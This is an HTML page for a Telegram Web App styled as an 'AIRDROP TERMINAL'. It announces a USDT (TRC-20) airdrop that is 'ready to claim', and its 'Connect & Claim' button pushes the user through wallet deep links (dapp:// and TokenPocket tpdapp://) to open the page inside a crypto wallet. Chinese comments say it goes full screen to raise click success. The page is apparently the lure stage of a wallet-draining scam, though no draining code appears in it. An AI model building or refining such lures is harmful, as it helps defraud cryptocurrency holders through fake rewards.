<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AIRDROP TERMINAL</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.js"></script>
    <style>
        body {
            background-color: #000;
            color: #ff0000;
            font-family: 'Courier New', Courier, monospace;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            overflow: hidden;
        }
        #terminal {
            width: 90%;
            border: 2px solid #ff0000;
            padding: 20px;
            box-shadow: 0 0 15px #ff0000;
            background: rgba(20, 0, 0, 0.8);
        }
        .btn {
            background: #ff0000;
            color: #000;
            border: none;
            padding: 15px 30px;
            font-weight: bold;
            margin-top: 20px;
            cursor: pointer;
            text-transform: uppercase;
            box-shadow: 0 0 10px #ff0000;
        }
        .glitch {
            animation: pulse 1.5s infinite;
        }
        @keyframes pulse {
            0% { opacity: 1; }
            50% { opacity: 0.5; }
            100% { opacity: 1; }
        }
    </style>
</head>
<body>
    <div id="terminal">
        <h2>> SYSTEM: AIRDROP_DETECTED</h2>
        <p>> STATUS: READY_TO_CLAIM</p>
        <p>> TOKEN: USDT (TRC-20)</p>
        <p id="wallet-addr">> WALLET: NOT CONNECTED</p>
    </div>
    <button class="btn glitch" onclick="connectAndClaim()">Connect & Claim</button>

<script>
    // 1. 初始化 Telegram 环境
    const tg = window.Telegram.WebApp;
    tg.ready();
    tg.expand(); // 让页面全屏，增加点击成功率

    function connectAndClaim() {
    tg.HapticFeedback.notificationOccurred('success');
    const terminal = document.getElementById('terminal');

    // 获取你当前的 GitHub Pages 完整地址
    const currentUrl = window.location.href;

    // 方案 A: 绝大多数钱包通用的 dapp 协议
    const dappLink = "dapp://" + currentUrl.replace(/^https?:\/\//, "");
    
    // 方案 B: TokenPocket 专用的强力拉起协议
    const tpLink = `tpdapp://open?params={"url":"${currentUrl}"}`;

    terminal.innerHTML += "<p style='color:#0f0'>> [RETRY]: ATTEMPTING_DIRECT_LINK...</p>";

    // 执行跳转
    try {
        // 在 iOS Telegram 中，尝试直接拉起协议
        tg.openLink(dappLink, { try_browser: true });
        
        // 如果 1 秒后没跳走，尝试 TP 专用链接
        setTimeout(() => {
            tg.openLink(tpLink, { try_browser: true });
        }, 1000);
    } catch (e) {
        // 最后的挣扎：强制浏览器跳转
        window.location.href = dappLink;
    }
}
</script>
</body>
</html>
